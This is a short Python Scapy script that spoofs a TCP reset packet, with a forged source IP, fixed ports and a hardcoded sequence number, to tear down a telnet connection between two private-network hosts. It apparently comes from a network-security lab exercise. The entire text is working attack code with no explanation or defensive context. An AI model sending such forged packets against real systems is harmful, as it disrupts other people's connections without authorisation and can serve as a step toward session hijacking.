#!/usr/bin/python3 
import sys
from scapy.all import*
print("Sending reset packet....")
IPLayer = IP(src = "192.168.56.101" ,dst = "192.168.56.103")
TCPLayer = TCP(sport = 52134,dport = 23,flags = "R",seq =627515029)
pkt=IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)